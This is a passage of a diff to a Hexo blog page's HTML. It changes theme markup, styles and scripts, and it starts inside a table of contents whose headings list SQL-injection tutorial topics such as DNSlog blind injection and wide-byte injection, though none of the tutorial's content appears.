post-toc-level-3"><a class="post-toc-link" href="#9-爆security数据库里的users表的第二个字段的第一个数据的长度"><span class="post-toc-text">9.爆security数据库里的users表的第二个字段的第一个数据的长度</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x08-Dnslog盲注"><span class="post-toc-text">0x08 Dnslog盲注</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x09-二次注入"><span class="post-toc-text">0x09 二次注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x10-宽字节注入"><span class="post-toc-text">0x10 宽字节注入</span></a></li></ol></li></ol>
+			</nav>
+			<div class="post-toc-bar"><div>
+		</aside>
+	
+
+	</div>
+</div>
 		</div>
+		</main>
+		
+		<!--footer-->
 		<footer>
 	<div class="blog-text-center">
-		<div class="social">
+		<div class="theme-annie-social">
 				
 				
 					<a href="http://github.com/" title="Github" target="_blank"><i class="fa fa-github"></i>&nbsp;</a>
@@ -457,7 +560,7 @@ code.has-numbering {
 	</div>
 
 	<div  class="blog-text-center">
-		<div class="copyright">
+		<div class="theme-annie-copyright">
 			
 				&copy; 2017 - 2018, content by vint. All Rights Reserved.			       	
 			
@@ -465,47 +568,50 @@ code.has-numbering {
 	</div>
 
 	<div class="blog-text-center">
-		<div class="copyright">
+		<div class="theme-annie-copyright">
 			<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.		
 		</div>
 	</div>
 </footer>
+		<!-- <script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script> -->
 
-
-
-
-
-
-		</main>
-
-		
-
-<script src="http://code.jquery.com/jquery-2.1.1.min.js" type="text/javascript"></script>
-
-<script>window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')</script>
-
-<script src="/js/main.js"></script> 
+<script>
+	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
+</script>
 
 <style>
 	.motto {
 		color: #000000;
 		font-size: 20px;
-		margin: 60px 20px 0 20px;
+		margin: 100px 25% 0;
+		width: 50%;
 		line-height: 1.4;
-		font-family: 'Fang Song', 'Song', 'STSong', sans-serif;
+		font-family:"KaiTi", "STXingkai", "Source Sans Pro", "Segoe UI", "Lucida Grande", Helvetica, Arial, "Microsoft YaHei", FreeSans, Arimo, "Droid Sans", "wenquanyi micro hei", "Hiragino Sans GB", "Hiragino Sans GB W3", FontAwesome, sans-serif;
 		text-align: center;
+	}
+	@media(max-width: 890px) {
+		.motto {	
+			margin: 100px 10% 0;
+			width: 80%;
+		}
+	}
+	@media(max-width: 890px) {
+		.motto {
+			margin: 100px 5% 0;
+			width: 90%;
+		}
 	}
 </style>
 
 
 	<script src="/js/motto.js"></script>
-	<script>
+	<script type="text/javascript">
 		$(".motto").html(getMingYanContent());
 	</script>	
 
 
 
-    <div class="popup search-popup local-search-popup">
+	<div class="popup search-popup local-search-popup">
     <span class="popup-btn-close">
       ESC
     </span>
@@ -843,11 +949,53 @@ code.has-numbering {
 
 
 
-<script src="/js/code.js"></script>
 
+	<script type="text/javascript" src="/js/toc.js"></script>
+
+
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript">
+	//generate a random img that pre_name 'from 0 to 110'
+	var random_bg = Math.floor(Math.random() * 109 + 1);
+
+	//var bg = 'url(/img/random/' + random_bg + '.jpg)';		
+	var bg = 'url(/img/random/' + random_bg + '.jpg)';
+
+	$("#header-bg-2").css("background-image", bg);
+</script>
+		
+		<!--back to top-->
+        <style type="text/css">
+	#totop {
+		background: white;
+		border-radius: 50%;
+		position: fixed;
+		right: 5.4%;
+		bottom: 80px;
+		cursor: pointer;
+	}
+	
+	#totop a {
+		color: #474747;
+		background-color: transparent;
+		padding: 10px;
+		text-decoration: none;
+	}
+	
+	@media(max-width:512px) {
+		#totop {
+			display: none;
+			visibility: hidden;
+		}
+	}
+</style>
+
+
+	<div id="totop">
+  		<a href="javascript:;" class="fa fa-arrow-up"></a>
+	</div>
 
 	</body>
 	</html>
-
-
 
